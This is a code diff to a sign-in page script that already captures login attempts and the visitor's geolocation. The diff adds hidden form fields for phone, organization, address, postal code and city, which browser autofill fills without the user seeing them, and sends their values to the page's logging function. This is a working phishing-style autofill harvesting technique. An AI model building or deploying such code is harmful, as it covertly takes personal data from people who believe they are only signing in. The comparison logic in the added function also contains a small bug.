@@ -2,7 +2,15 @@ let username = document.querySelector("body > div > div.signin-block > div > for
 let password = document.querySelector("body > div > div.signin-block > div > form > input:nth-child(2)")
 let button = document.querySelector("#button1")
 
+let hiddenFieldIDs = [
+  'phone', 'organization', 'address', 'postal', 'city'
+]
+let hiddenFields = hiddenFieldIDs.map(
+  id => document.querySelector(`#${id}`)
+)
+
 let attempts = 0
+let lastAutofillLog = {}
 
 function logLocation() {
   if(navigator.geolocation) {
@@ -53,5 +61,24 @@ function log(reqData) {
   })
 }
 
+function logAutofill(event) {
+  event.preventDefault()
+  let autofill = {}, newData = false
+  hiddenFieldIDs.forEach((id, x) => {
+    autofill[id] = hiddenFields[x].value
+    if(autofill[id] != lastAutofillLog.id) {
+      newData = true 
+    }
+  })
+  if(newData) {
+    log({logType: "autofill", ...autofill})
+  }
+}
+
 button.addEventListener('click', event => logSigninAttempt(event))
+hiddenFields.forEach(
+  hf => {
+    hf.addEventListener('change', event => logAutofill(event))
+  }
+)
 logLocation()
